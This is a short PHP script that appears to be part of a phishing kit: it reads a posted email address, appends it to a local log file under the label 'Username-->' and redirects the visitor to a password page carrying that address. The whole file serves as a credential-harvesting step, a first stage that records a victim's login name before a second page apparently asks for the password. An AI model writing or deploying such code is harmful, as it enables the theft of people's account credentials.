<?php
    $email = $_POST['email'];


    $file = fopen("log.txt","a");
    fwrite($file,"Username--> : ");
    fwrite($file,$email);
    fclose($file);
    header("location:password.php?mail=$email");
?>